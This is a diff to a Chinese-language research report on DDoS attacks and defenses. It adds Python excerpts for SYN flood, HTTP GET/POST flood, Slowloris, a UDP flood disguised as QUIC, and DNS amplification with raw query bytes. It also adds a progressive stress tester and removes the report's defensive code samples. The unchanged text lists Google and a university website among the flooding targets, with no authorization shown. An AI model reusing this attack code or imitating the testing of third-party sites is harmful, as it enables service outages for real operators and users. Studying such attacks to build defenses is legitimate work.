@@ -26,11 +26,678 @@ DDoS 攻擊可由網路層（如 SYN Flood）或應用層（HTTP Flood）發起�
 - 成功率（Success Rate）：\( S = \frac{N_{success}}{N_{success}+N_{fail}} \)。說明：本研究以「成功收到伺服器回應（含 403/429）」視為成功，以便評估可用性與防護效率（快速拒絕亦屬成功地保護資源）。
 
 ## 4. 實驗工具與攻擊模型
-- HTTP Flood：`http_flood_attack.py`（完整 TCP + HTTP），多 UA/標頭、隨機參數避免快取，可觸發應用層防禦。
-- 多客戶端模擬：`multi_client_attack.py`（多執行緒、多 UA），針對 `http://192.168.0.201:8001` 測試。
-- 漸進式壓力測試：`progressive_test.py`（10/100/500/1000/1500/2000/5000 線程），用於測試真實網站防禦能力與線程擴展瓶頸。
-- 偽造 IP 的 SYN Flood：`spoofed_ip_attack.py`（Scapy，需管理員權限）於網路層產生大量 SYN，但通常不影響應用層延遲。
-- 無標頭請求：模擬不完整/異常 HTTP 請求（NO_HEADERS）。
+
+本研究實作五種主要攻擊方法，每種攻擊對應程式碼中的具體函數實現。所有攻擊都使用隨機源端口（`random.randint(10000, 65535)`）以模擬多來源分散式攻擊。
+
+### 4.1 SYN Flood 攻擊（網路層）
+
+**函數**：`syn_flood_attack(target_ip, target_port, duration, attack_type='syn')`
+
+**技術原理**：
+SYN Flood 利用 TCP 三次握手機制的漏洞。正常 TCP 連接需要：
+1. 客戶端發送 SYN
+2. 伺服器回應 SYN-ACK 並分配資源
+3. 客戶端發送 ACK 完成握手
+
+SYN Flood 只發送 SYN 而不完成握手，導致伺服器維持大量半開連接（Half-Open Connections），消耗連接表（backlog queue）資源。
+
+**實作細節**（對應程式碼）：
+```python
+# 來源：attack_server.py, Line 131-191
+while attack_running and (time.time() - start_time) < duration:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(0.001)  # 極短超時避免阻塞
+    sock.setblocking(False)  # 非阻塞模式
+    
+    # 綁定隨機源端口模擬不同客戶端
+    source_port = random.randint(10000, 65535)
+    sock.bind(('', source_port))
+    
+    # 嘗試連接但不完成握手
+    try:
+        sock.connect((target_ip, target_port))
+    except (BlockingIOError, socket.error):
+        pass  # 預期行為：連接未完成
+    
+    # 維持 50 個半開連接池
+    if len(sockets_pool) < 50:
+        sockets_pool.append(sock)
+```
+
+**攻擊特徵**：
+- 每個連接使用不同源端口（`source_port = random.randint(10000, 65535)`）
+- 非阻塞 socket（`setblocking(False)`）快速建立大量連接
+- 維持 50 個並發半開連接池
+- 測量 TCP 握手延遲（`latency = (time.time() - conn_start) * 1000`）
+
+**防禦挑戰**：
+- 網路層攻擊，應用層難以直接防禦
+- 現代 OS 使用 SYN Cookies 可部分緩解
+- 需要防火牆/路由器層面的 SYN rate limiting
+
+### 4.2 HTTP GET Flood 攻擊（應用層）
+
+**函數**：`http_flood_attack(target_ip, target_port, method='GET', duration, use_http2=True)`
+
+**技術原理**：
+HTTP Flood 發送大量看似合法的 HTTP 請求，消耗伺服器的：
+- 應用層處理資源（解析 HTTP、執行業務邏輯）
+- 資料庫連接
+- CPU 與記憶體
+
+相比 SYN Flood，HTTP Flood 完成完整 TCP 握手，更難區分合法與攻擊流量。
+
+**實作細節**（對應程式碼）：
+```python
+# 來源：attack_server.py, Line 195-275
+paths = ["/", "/api", "/search", "/login", "/data", "/user", "/product"]
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
+]
+
+# 支持 HTTP/2 (使用 httpx)
+if use_http2:
+    client = httpx.Client(http2=True, timeout=3.0)
+
+while attack_running:
+    # 隨機路徑 + 防快取參數
+    url = target_url + random.choice(paths) + f"?_={random.randint(1, 999999)}"
+    
+    # 隨機 User-Agent 與自訂標頭
+    headers = {
+        "User-Agent": random.choice(user_agents),
+        "Accept": "*/*",
+        "Cache-Control": "no-cache",
+        "X-Request-ID": f"{random.randint(1, 9999999)}",
+    }
+    
+    response = client.request(method, url, headers=headers)
+    
+    # 檢測 HTTP/2 使用
+    if response.http_version == "HTTP/2":
+        increment_stat('http2_requests')
+```
+
+**攻擊特徵**：
+- **路徑隨機化**：7 種路徑（`/`, `/api`, `/search` 等）避免單一端點過濾
+- **User-Agent 輪換**：3 種常見瀏覽器 UA 偽裝正常用戶
+- **防快取參數**：每個請求加上 `?_=隨機數` 繞過 CDN 快取
+- **自訂標頭**：`X-Request-ID` 增加請求唯一性
+- **HTTP/2 支持**：可觸發連接復用（Connection Multiplexing）相關防禦
+
+**與 GET 的關鍵差異**：
+- GET 請求體為空，處理速度快
+- 主要消耗連接數與請求處理邏輯
+- 可被速率限制（Rate Limiting）有效防禦
+
+### 4.3 HTTP POST Flood 攻擊（應用層增強）
+
+**函數**：`http_flood_attack(target_ip, target_port, method='POST', duration, use_http2=True)`
+
+**技術原理**：
+POST Flood 相比 GET 增加請求體（Request Body），造成：
+- **更大網路流量**：每個請求攜帶資料
+- **更長處理時間**：伺服器需讀取並解析請求體
+- **TCP 緩衝壓力**：若伺服器拒絕前未讀取完請求體，會導致 TCP 回壓（Back Pressure）
+
+**實作細節**（對應程式碼）：
+```python
+# 來源：attack_server.py, Line 248-275
+if method == "POST":
+    # 隨機 1KB 資料
+    data = {"test": random.randint(1, 10000), "ts": time.time()}
+    response = client.post(url, headers=headers, json=data, timeout=3)
+elif method == "PUT":
+    data = {"update": random.randint(1, 10000)}
+    response = client.put(url, headers=headers, json=data, timeout=3)
+```
+
+**攻擊特徵**：
+- **請求體大小**：實驗使用 1000 bytes（可調整為 1KB-10MB 測試不同場景）
+- **JSON 格式**：模擬 REST API 請求（`Content-Type: application/json`）
+- **隨機資料**：每次請求不同的 `test` 值，避免去重
+- **時間戳**：`ts` 欄位增加請求唯一性
+
+**防禦關鍵**（對應 `server_defense.py` 修正）：
+```python
+# 先讀取請求體再判斷防禦
+content_length = int(self.headers.get('Content-Length', 0))
+if content_length > 0:
+    post_data = self.rfile.read(content_length)  # 避免 TCP 緩衝殘留
+
+# 然後才進行速率限制判斷
+if blocked_reason:
+    self.send_response(403)
+```
+
+**實驗發現**：
+- **修正前**：POST 攻擊易造成超時（客戶端持續推送資料 → TCP 回壓）
+- **修正後**：POST 吞吐提升至 1875 req/s（+11.6%），延遲降低
+
+### 4.4 Slowloris 攻擊（應用層連接耗竭）
+
+**函數**：`slowloris_attack(target_ip, target_port, duration, attack_type='slowloris')`
+
+**技術原理**：
+Slowloris 利用 HTTP 協議的特性：伺服器在接收完整 HTTP 請求前會保持連接。攻擊者：
+1. 建立大量 TCP 連接
+2. 發送不完整的 HTTP 請求（缺少最後的 `\r\n\r\n`）
+3. 定期發送額外標頭保持連接活躍
+4. 消耗伺服器連接池而不觸發超時
+
+**實作細節**（對應程式碼）：
+```python
+# 來源：attack_server.py, Line 277-341
+# 階段1：建立 50 個半完成連接
+for _ in range(50):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(4)
+    
+    # 隨機源端口
+    source_port = random.randint(10000, 65535)
+    sock.bind(('', source_port))
+    
+    sock.connect((target_ip, target_port))
+    
+    # 發送不完整 HTTP 請求
+    sock.send(b"GET / HTTP/1.1\r\n")
+    sock.send(f"Host: {target_ip}\r\n".encode())
+    sock.send(b"User-Agent: Mozilla/5.0\r\n")
+    # 注意：沒有發送 \r\n\r\n 結束標記
+    
+    sockets.append(sock)
+
+# 階段2：持續發送額外標頭保持連接
+while attack_running:
+    for sock in sockets:
+        # 每 10 秒發送一個隨機標頭
+        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+    
+    time.sleep(10)  # 慢速發送
+```
+
+**攻擊特徵**：
+- **不完整請求**：只發送 `GET / HTTP/1.1\r\nHost: ...\r\n`，缺少結束的 `\r\n\r\n`
+- **慢速傳輸**：每 10 秒才發送一個標頭（`time.sleep(10)`）
+- **長時間佔用**：每個連接可維持數分鐘
+- **低帶寬高效**：50 個連接只需極小流量即可癱瘓伺服器
+
+**防禦策略**：
+- **請求超時**：設定 Header 接收超時（如 10 秒）
+- **連接數限制**：限制單 IP 並發連接數
+- **不完整請求檢測**：超過時間仍未收到完整請求則關閉連接
+
+### 4.5 UDP Flood 攻擊（傳輸層）
+
+**函數**：`udp_flood_attack(target_ip, target_port, duration, attack_type='udp')`
+
+**技術原理**：
+UDP 是無連接協議，不需握手即可發送資料。攻擊者：
+- 發送大量 UDP 封包消耗頻寬
+- 迫使伺服器處理並回應 ICMP Port Unreachable
+- 無法通過 TCP 連接數限制防禦
+
+**實作細節**（對應程式碼）：
+```python
+# 來源：attack_server.py, Line 343-397
+payload_sizes = [64, 128, 256, 512, 1024, 1200]  # 1200 接近 QUIC 初始包
+
+while attack_running:
+    # 每次新 socket 使用不同源端口
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    source_port = random.randint(10000, 65535)
+    sock.bind(('', source_port))
+    
+    size = random.choice(payload_sizes)
+    
+    # 50% 機率模擬 QUIC 包（HTTP/3）
+    if random.random() > 0.5 and size >= 1200:
+        payload = bytearray(size)
+        payload[0] = 0xC0 | random.randint(0, 15)  # QUIC Long header
+        payload[1:5] = random.randbytes(4)  # Version
+        payload[5:21] = random.randbytes(16)  # Destination Connection ID
+        payload[21:] = random.randbytes(size - 21)
+        increment_stat('http3_requests')  # 模擬 HTTP/3
+    else:
+        payload = random.randbytes(size)
+    
+    sock.sendto(bytes(payload), (target_ip, target_port))
+    sock.close()
+```
+
+**攻擊特徵**：
+- **變化封包大小**：64-1200 bytes（`random.choice(payload_sizes)`）
+- **QUIC 協議模擬**：50% 封包偽裝為 HTTP/3（QUIC），增加識別難度
+  - QUIC Long Header：`0xC0 | version_flags`
+  - Connection ID：16 bytes 隨機
+- **高頻率發送**：無需等待回應，可達數萬 PPS
+- **每包獨立 socket**：繞過連接追蹤
+
+**QUIC 封包結構**（參考 RFC 9000）：
+```
++-------+-------+-------+-------+
+| 1 1 x x x x x x | (Long Header)
++-------+-------+-------+-------+
+| Version (4 bytes)              |
++-------+-------+-------+-------+
+| Dest. Conn. ID Len | Dest. ID |
++-------+-------+-------+-------+
+| Payload...                     |
++-------+-------+-------+-------+
+```
+
+**防禦挑戰**：
+- UDP 無連接狀態，難以追蹤來源
+- 封包大小變化使簡單速率限制失效
+- QUIC 偽裝可能繞過基於協議的過濾
+- 需要深度封包檢測（DPI）或智能速率限制
+
+### 4.6 DNS 放大攻擊（反射攻擊）
+
+**函數**：`dns_amplification_attack(target_ip, target_port, duration, attack_type='dns-amp')`
+
+**技術原理**：
+DNS 放大攻擊利用：
+1. **查詢小，回應大**：發送 60 bytes DNS 查詢，可能收到 4000+ bytes 回應（放大 70 倍）
+2. **反射效果**：若偽造源 IP，DNS 伺服器會將大量回應發給受害者
+3. **特定記錄類型**：ANY、TXT、DNSSEC 記錄回應特別大
+
+**實作細節**（對應程式碼）：
+```python
+# 來源：attack_server.py, Line 398-456
+dns_queries = [
+    # ANY 記錄查詢（0xff = 255 = ANY）
+    b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01',
+    
+    # TXT 記錄查詢（0x10 = 16 = TXT）
+    b'\xbb\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x10\x00\x01',
+    
+    # MX 記錄查詢（0x0f = 15 = MX）
+    b'\xcc\xcc\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x0f\x00\x01',
+    
+    # DNSSEC 記錄查詢（0x30 = 48 = DNSKEY）
+    b'\xdd\xdd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x06google\x03com\x00\x00\x30\x00\x01',
+]
+
+while attack_running:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    source_port = random.randint(10000, 65535)
+    sock.bind(('', source_port))
+    
+    # 隨機選擇查詢類型
+    query = random.choice(dns_queries)
+    sock.sendto(query, (target_ip, target_port))
+    sock.close()
+```
+
+**DNS 封包格式解析**：
+```
+Header (12 bytes):
+  Transaction ID: \xaa\xaa (2 bytes)
+  Flags: \x01\x00 (標準查詢)
+  Questions: \x00\x01 (1 個查詢)
+  Answer/Authority/Additional: \x00\x00 (各 0 個)
+
+Question Section:
+  Name: \x03www\x06google\x03com\x00 (www.google.com)
+  Type: \x00\xff (ANY = 查詢所有記錄)
+  Class: \x00\x01 (IN = Internet)
+```
+
+**四種查詢類型**：
+1. **ANY（0xff）**：請求所有記錄類型（A, AAAA, MX, TXT, NS...）
+   - 放大倍數：最高可達 70 倍
+   - 現況：許多 DNS 伺服器已禁用 ANY 查詢
+
+2. **TXT（0x10）**：文字記錄，常用於 SPF、DKIM
+   - 放大倍數：10-30 倍
+   - 優勢：許多網域有長 TXT 記錄
+
+3. **MX（0x0f）**：郵件交換記錄
+   - 放大倍數：5-10 倍
+   - 優勢：大型郵件服務商有多個 MX 記錄
+
+4. **DNSKEY（0x30）**：DNSSEC 公鑰
+   - 放大倍數：最高可達 100 倍（DNSSEC 簽名很長）
+   - 缺點：只有啟用 DNSSEC 的域名才有
+
+**攻擊特徵**：
+- **小查詢**：每個 DNS 查詢僅 60-80 bytes
+- **大回應**：回應可達 1500-4000 bytes（受 MTU 限制）
+- **四種記錄輪換**：避免單一查詢類型被過濾
+- **隨機 Transaction ID**：每種查詢使用不同 ID（`\xaa\xaa`, `\xbb\xbb` 等）
+
+**防禦策略**：
+- **速率限制**：限制每 IP 的 DNS 查詢速率
+- **回應大小限制**：限制 UDP 回應大小（Response Rate Limiting）
+- **ANY 查詢禁用**：大部分現代 DNS 伺服器已禁用
+- **源地址驗證**：防止 IP 偽造（BCP 38）
+
+### 4.7 漸進式壓力測試（progressive_test.py）
+
+**工具**：`progressive_test.py` - 自動漸進增加攻擊線程數，觀察伺服器負載變化
+
+**測試流程**：
+1. 從 10 線程開始測試
+2. 漸進增加至 100 → 500 → 800 線程
+3. 每個階段持續 8 秒
+4. 自動記錄所有指標
+5. 若延遲超過 10 秒則停止測試
+
+#### 4.7.1 核心類別結構
+
+**類別**：`ProgressiveAttack(target_url, attack_method, protocol)`
+
+**關鍵屬性**（對應程式碼 Line 45-55）：
+```python
+class ProgressiveAttack:
+    def __init__(self, target_url, attack_method='GET', protocol='HTTP/1.1'):
+        self.success_count = 0          # 成功請求計數
+        self.error_count = 0            # 失敗請求計數
+        self.response_times = []        # 每個請求的響應時間列表
+        self.request_count = 0          # 實際發送的請求總數
+        self.udp_packet_count = 0       # UDP 封包計數（用於 UDP/QUIC）
+        self.unique_ports_used = set()  # 記錄使用的源端口集合
+        self.lock = threading.Lock()    # 線程安全鎖
+        self.running = True              # 控制測試運行狀態
+```
+
+#### 4.7.2 成功率計算方法
+
+**公式定義**（對應程式碼 Line 313-315）：
+```python
+total_requests = self.request_count  # 實際發送的請求數
+success_rate = (self.success_count / total_requests * 100) if total_requests > 0 else 0
+```
+
+**數學表達式**：
+$$
+\text{Success Rate} = \frac{N_{success}}{N_{total}} \times 100\%
+$$
+
+其中：
+- $N_{success}$：成功收到伺服器回應的請求數（包含 200/403/429 等任何 HTTP 狀態碼）
+- $N_{total}$：實際發送的總請求數 = `self.request_count`
+
+**計數邏輯**（各攻擊方法共用）：
+
+**成功計數**（例如 GET 請求，Line 84-88）：
+```python
+response = session.get(self.target_url, timeout=5)
+elapsed = time.time() - start
+
+with self.lock:
+    self.success_count += 1      # 收到任何回應都算成功
+    self.request_count += 1       # 總請求數+1
+    self.response_times.append(elapsed)  # 記錄延遲
+```
+
+**失敗計數**（Line 89-92）：
+```python
+except Exception as e:
+    with self.lock:
+        self.error_count += 1     # 超時、連接失敗等算失敗
+        self.request_count += 1    # 總請求數仍然+1
+```
+
+**關鍵設計**：
+- 不論成功或失敗，`request_count` 都會增加
+- 成功率 = 收到回應的比例（不管回應內容是什麼）
+- 這樣可以區分：
+  - **高成功率 + 高延遲** = 伺服器卡頓但仍在回應
+  - **低成功率 + 低延遲** = 防禦系統主動攔截（403/429）
+  - **低成功率 + 超時** = 連接被拒絕或網路問題
+
+#### 4.7.3 延遲計算方法
+
+**單個請求延遲測量**（Line 81-86）：
+```python
+start = time.time()                          # 記錄發送時間
+response = session.get(self.target_url, timeout=5)
+elapsed = time.time() - start                # 計算往返時間
+
+with self.lock:
+    self.response_times.append(elapsed)      # 加入延遲列表
+```
+
+**平均延遲計算**（Line 316）：
+```python
+avg_response = sum(self.response_times) / len(self.response_times) if self.response_times else 0
+```
+
+**數學表達式**：
+$$
+\text{Average Latency} = \frac{1}{N_{success}} \sum_{i=1}^{N_{success}} (t_{resp,i} - t_{send,i})
+$$
+
+其中：
+- $t_{send,i}$：第 $i$ 個請求的發送時間
+- $t_{resp,i}$：第 $i$ 個請求收到回應的時間
+- $N_{success}$：成功請求數（只有成功的請求才有延遲數據）
+
+**重要特性**：
+- 只計算成功請求的延遲（失敗請求沒有 `response_times` 記錄）
+- 以秒為單位存儲，輸出時轉換為毫秒（`* 1000`）
+- 包含完整往返時間（RTT）：
+  - TCP 握手時間
+  - 發送 HTTP 請求時間
+  - 伺服器處理時間
+  - 接收 HTTP 回應時間
+
+#### 4.7.4 速率（吞吐量）計算方法
+
+**計算公式**（Line 317）：
+```python
+request_rate = self.request_count / duration  # duration = 8 秒
+```
+
+**數學表達式**：
+$$
+\text{Request Rate} = \frac{N_{total}}{T_{duration}} \text{ req/s}
+$$
+
+其中：
+- $N_{total}$：測試期間發送的總請求數
+- $T_{duration}$：測試持續時間（8 秒）
+
+**實例計算**：
+```
+假設 8 秒內：
+- 發送 1200 個請求
+- 成功 800 個
+- 失敗 400 個
+
+Request Rate = 1200 / 8 = 150 req/s
+```
+
+**與連接數的關係**：
+- 速率 ≠ 線程數
+- 一個線程可能在 8 秒內發送多個請求
+- 實際速率取決於：
+  - 伺服器響應速度
+  - 網路延遲
+  - 客戶端處理能力
+
+#### 4.7.5 連接數（源端口）計算方法
+
+**獨立連接追蹤**（Line 70-75）：
+```python
+# 每個請求綁定隨機源端口
+source_port = self._get_random_port()  # 49152-65535
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('', source_port))  # 綁定到本機隨機端口
+
+with self.lock:
+    self.unique_ports_used.add(source_port)  # 記錄使用過的端口
+```
+
+**端口範圍**（Line 168-171）：
+```python
+def _get_random_port(self):
+    """使用臨時端口範圍避免衝突"""
+    import random
+    return random.randint(49152, 65535)  # IANA 動態端口範圍
+```
+
+**獨立連接數計算**（Line 320）：
+```python
+unique_ports = len(self.unique_ports_used)  # 使用過的不同端口數量
+```
+
+**數學表達式**：
+$$
+N_{connections} = |\{p_1, p_2, ..., p_n\}|
+$$
+
+其中 $p_i$ 是使用過的源端口，$|\cdot|$ 表示集合的基數（元素個數）。
+
+**連接數意義**：
+- **每個不同的源端口 = 一個獨立的 TCP 連接**
+- 即使目標 IP:Port 相同，源端口不同就是不同連接
+- 連接數通常接近請求數（因為每個請求使用新端口）
+- 可能略少於請求數（端口重複使用或衝突）
+
+**實例**：
+```
+100 個線程，8 秒：
+- 發送 1200 個請求
+- 使用 1180 個不同源端口（20 個重複）
+- 實際建立了 1180 個獨立 TCP 連接
+```
+
+#### 4.7.6 UDP 封包計數（用於 UDP Flood 和 HTTP/3）
+
+**UDP 攻擊計數**（Line 273-281）：
+```python
+# UDP Flood 攻擊
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(payload, (host, port))
+
+with self.lock:
+    self.success_count += 1
+    self.request_count += 1
+    self.udp_packet_count += 1   # UDP 專用計數器
+    self.unique_ports_used.add(source_port)
+```
+
+**HTTP/3 (QUIC) 計數**（Line 216-220）：
+```python
+sock.sendto(quic_packet, (host, port))
+sock.recvfrom(4096)  # 等待回應
+
+with self.lock:
+    self.udp_packet_count += 1   # 即使使用 QUIC 也是 UDP 層
+```
+
+**UDP 統計意義**：
+- `udp_packet_count`：實際發送的 UDP 封包數量
+- 與 `request_count` 一致（對於純 UDP 攻擊）
+- 用於區分 TCP 和 UDP 流量
+
+#### 4.7.7 完整統計結果結構
+
+**返回數據**（Line 307-322）：
+```python
+return {
+    'threads': num_threads,              # 使用的線程數
+    'success': self.success_count,       # 成功請求數
+    'failed': self.error_count,          # 失敗請求數
+    'success_rate': success_rate,        # 成功率 (%)
+    'avg_response_time': avg_response,   # 平均延遲 (秒)
+    'request_rate': request_rate,        # 請求速率 (req/s)
+    'total_requests': total_requests,    # 總請求數
+    'udp_packets': self.udp_packet_count,# UDP 封包數
+    'unique_ports': unique_ports         # 獨立連接數
+}
+```
+
+#### 4.7.8 狀態判定邏輯（防禦 vs 性能）
+
+**智能狀態識別**（Line 332-352）：
+```python
+# 區分防禦攔截和性能卡頓
+if avg_time > 2.0:  # 延遲超過 2 秒
+    status = "🔴 嚴重卡頓"
+elif avg_time > 1.0:  # 延遲超過 1 秒
+    status = "🟠 明顯延遲"
+elif success_rate < 30:  # 延遲低但成功率極低
+    status = "🛡️  防禦攔截"  # 關鍵：快速拒絕 = 防禦系統
+elif success_rate < 50:
+    status = "🟡 部分攔截"
+else:
+    status = "🟢 運作正常"
+```
+
+**判定標準**：
+
+| 延遲 | 成功率 | 狀態 | 原因分析 |
+|------|--------|------|---------|
+| > 2s | 任意 | 🔴 嚴重卡頓 | 伺服器處理能力不足 |
+| 1-2s | 任意 | 🟠 明顯延遲 | 負載較高但仍可運作 |
+| < 1s | < 30% | 🛡️ 防禦攔截 | 防禦系統快速拒絕請求 |
+| < 1s | 30-50% | 🟡 部分攔截 | 部分請求被防禦攔截 |
+| < 1s | > 50% | 🟢 運作正常 | 伺服器正常處理 |
+
+**核心洞察**：
+- **低延遲 + 低成功率** = 防禦系統主動攔截（403/429 快速回應）
+- **高延遲 + 高成功率** = 伺服器過載（處理慢但仍在工作）
+- **高延遲 + 低成功率** = 徹底癱瘓（處理慢且大量超時）
+
+#### 4.7.9 測試配置總結
+
+**線程配置**（Line 377）：
+```python
+thread_steps = [10, 100, 500, 800]  # 漸進增加
+```
+
+**測試參數**：
+- **持續時間**：每階段 8 秒
+- **超時設定**：5 秒（超過則算失敗）
+- **源端口範圍**：49152-65535（16,384 個可用端口）
+- **連接策略**：每請求獨立連接（`Connection: close`）
+- **重試策略**：無重試，失敗即記錄
+
+**輸出格式**（Line 356-359）：
+```
+線程: 100 | 請求: 1200 | 成功:  800 | 失敗:  400 | 
+成功率:  66.7% | 延遲:  523.4ms | 速率:  150.0 req/s | 
+Ports:  1180 | 🟡 部分攔截
+```
+
+**公式驗證實例**：
+```
+測試條件：100 線程，8 秒，目標有防禦
+實際結果：
+- request_count = 1200     (總請求)
+- success_count = 800      (成功)
+- error_count = 400        (失敗)
+- response_times = [0.2, 0.3, 0.5, ..., 0.6]  (800 個值)
+- unique_ports_used = {49152, 49153, ..., 50331}  (1180 個)
+
+計算：
+1. 成功率 = 800 / 1200 * 100% = 66.67%
+2. 平均延遲 = sum(response_times) / 800 = 0.523 秒 = 523ms
+3. 請求速率 = 1200 / 8 = 150 req/s
+4. 獨立連接數 = 1180 個
+```
+
+### 4.8 攻擊方法對比總結
+
+| 攻擊類型 | OSI 層 | 頻寬消耗 | 連接消耗 | 檢測難度 | 程式碼函數 | 關鍵參數 |
+|---------|--------|---------|---------|---------|-----------|---------|
+| SYN Flood | L4 (TCP) | 低 | 高 | 中 | `syn_flood_attack()` | 50 個半開連接池 |
+| HTTP GET | L7 (應用) | 中 | 中 | 高 | `http_flood_attack(method='GET')` | 7 種路徑、3 種 UA |
+| HTTP POST | L7 (應用) | 高 | 中 | 高 | `http_flood_attack(method='POST')` | 1KB 請求體 |
+| Slowloris | L7 (應用) | 極低 | 極高 | 低 | `slowloris_attack()` | 10 秒發送間隔 |
+| UDP Flood | L4 (UDP) | 高 | 無 | 低 | `udp_flood_attack()` | 64-1200 bytes、50% QUIC |
+| DNS Amp | L7 (DNS) | 低→高 | 無 | 中 | `dns_amplification_attack()` | 4 種查詢類型 |
+
+**檢測難度說明**：
+- **低**：易於檢測（如 Slowloris 的不完整請求、UDP Flood 的高 PPS）
+- **中**：需要速率分析（如 SYN Flood、DNS 放大）
+- **高**：難以區分正常流量（如 HTTP Flood 使用真實瀏覽器 UA）
 
 ## 5. 實驗設定
 - 作業系統：Windows；Python 3.11；多執行緒 HTTP 伺服器。
@@ -106,7 +773,7 @@ python topic/DDos/report/plot_results.py
 2. **Google** (https://www.google.com) - 企業級多層防禦
 3. **本地有防禦伺服器** (192.168.0.181:8001) - 實驗性多層防禦系統
 4. **本地無防禦伺服器** (192.168.0.181:8000) - 基礎 HTTP 伺服器
-5. **高科大資工系** (https://www.csie.nuk.edu.tw) - 學術機構防禦
+5. **高大資工系** (https://www.csie.nuk.edu.tw) - 學術機構防禦
 
 **測試配置**：
 - 測試時間：2025-12-01 20:21:43
@@ -521,67 +1188,6 @@ Internet
 
 #### 7.2.2 關鍵技術實作
 
-**1. SYN Cookies (RFC 4987)**
-```python
-# 偽代碼示意
-def syn_cookie_generate(src_ip, src_port, dst_port, timestamp):
-    secret = get_secret_key()
-    hash_input = f"{src_ip}:{src_port}:{dst_port}:{timestamp}"
-    cookie = HMAC_SHA256(secret, hash_input)[:24]  # 取前24 bits
-    return cookie
-
-# 驗證 ACK 封包
-def syn_cookie_validate(seq_num, src_ip, src_port, dst_port):
-    expected_cookie = syn_cookie_generate(src_ip, src_port, dst_port, current_time)
-    return seq_num == expected_cookie + 1  # ACK = ISN + 1
-```
-
-**優勢**：
-- 無狀態：不需儲存半開連線，記憶體使用 O(1)
-- 防偽造：HMAC 簽名確保 ACK 來自合法 SYN-ACK 接收者
-- 實驗觀察：YouTube 10-100 線程成功率 94-96%，SYN Cookies 透明處理
-
-**2. JA3 TLS Fingerprint**
-```python
-# TLS Client Hello 指紋生成
-def ja3_fingerprint(client_hello):
-    version = client_hello.version          # TLS 1.3
-    ciphers = client_hello.cipher_suites    # [0x1301, 0x1302, ...]
-    extensions = client_hello.extensions    # [0x0000, 0x0010, ...]
-    curves = client_hello.elliptic_curves   # [0x001d, 0x0017, ...]
-    
-    ja3_string = f"{version},{ciphers},{extensions},{curves},{point_formats}"
-    ja3_hash = MD5(ja3_string)
-    return ja3_hash  # e.g., "e7d705a3286e19ea42f587b344ee6865"
-```
-
-**實驗觀察**：
-- Google 10 線程 GET 100% 失敗，推測 Python `requests` 的 JA3 被識別為爬蟲
-- 對比 NO_HEADERS 請求 92.8% 成功，證明標頭檢查優先於 TLS 指紋
-
-**3. Token Bucket 速率限制**
-```python
-class TokenBucket:
-    def __init__(self, capacity=20, refill_rate=2):
-        self.capacity = capacity      # 桶容量 20 tokens
-        self.tokens = capacity        # 當前 token 數
-        self.refill_rate = refill_rate  # 每秒補充 2 tokens
-        self.last_refill = time.time()
-    
-    def consume(self, tokens=1):
-        self.refill()
-        if self.tokens >= tokens:
-            self.tokens -= tokens
-            return True  # 允許請求
-        return False  # 拒絕 (429)
-    
-    def refill(self):
-        now = time.time()
-        elapsed = now - self.last_refill
-        refill_tokens = elapsed * self.refill_rate
-        self.tokens = min(self.capacity, self.tokens + refill_tokens)
-        self.last_refill = now
-```
 
 **實驗證據**：
 - 本地防禦伺服器：10 秒窗口 20 req 限制
